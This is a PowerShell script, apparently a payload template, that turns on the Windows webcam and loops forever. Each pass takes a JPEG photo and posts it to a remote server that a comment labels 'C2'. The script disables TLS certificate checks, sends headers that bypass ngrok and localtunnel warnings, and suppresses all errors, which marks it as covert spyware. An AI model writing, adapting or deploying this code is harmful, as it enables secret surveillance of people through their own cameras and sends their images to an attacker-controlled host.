Add-Type -AssemblyName System.Runtime.WindowsRuntime
$mc = [Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]::new()

$asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq "System.Runtime.WindowsRuntime" }
$extType = $asm.GetType("System.WindowsRuntimeSystemExtensions")

# Get AsTask methods for IAsyncAction and IAsyncOperation<T>
$asTaskMethod = $extType.GetMethods() | Where-Object { $_.Name -eq "AsTask" -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq "IAsyncAction" } | Select-Object -First 1
$asTaskGenericMethod = $extType.GetMethods() | Where-Object { $_.Name -eq "AsTask" -and $_.IsGenericMethod -and $_.GetParameters()[0].ParameterType.Name -match "IAsyncOperation" } | Select-Object -First 1
$genericAsTask = $asTaskGenericMethod.MakeGenericMethod([uint32])

# Initialize Camera
$initOp = $mc.InitializeAsync()
$task = $asTaskMethod.Invoke($null, @($initOp))
$task.Wait()

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
$url = "${BaseUrl}/c/${Uid}"

while ($true) {
    try {
        $stream = [Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage, ContentType=WindowsRuntime]::new()
        $jpeg = [Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]::CreateJpeg()

        # Capture Photo
        $captureOp = $mc.CapturePhotoToStreamAsync($jpeg, $stream)
        $task2 = $asTaskMethod.Invoke($null, @($captureOp))
        $task2.Wait()

        $size = $stream.Size
        if ($size -gt 0) {
            $bytes = New-Object byte[] $size
            $inputStream = $stream.GetInputStreamAt(0)
            $reader = [Windows.Storage.Streams.DataReader, Windows.Storage, ContentType=WindowsRuntime]::new($inputStream)
            
            # Read Stream
            $loadOp = $reader.LoadAsync($size)
            $task3 = $genericAsTask.Invoke($null, @($loadOp))
            $task3.Wait()
            
            $reader.ReadBytes($bytes)
            
            # Post back to C2
            $headers = @{"ngrok-skip-browser-warning"="1"; "Bypass-Tunnel-Reminder"="1"}
            Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bytes -ContentType "application/octet-stream" -ErrorAction SilentlyContinue
            
            $reader.Dispose()
            $inputStream.Dispose()
        }
        $stream.Dispose()
    } catch {}
    
    Start-Sleep -Milliseconds ${Delay}
}
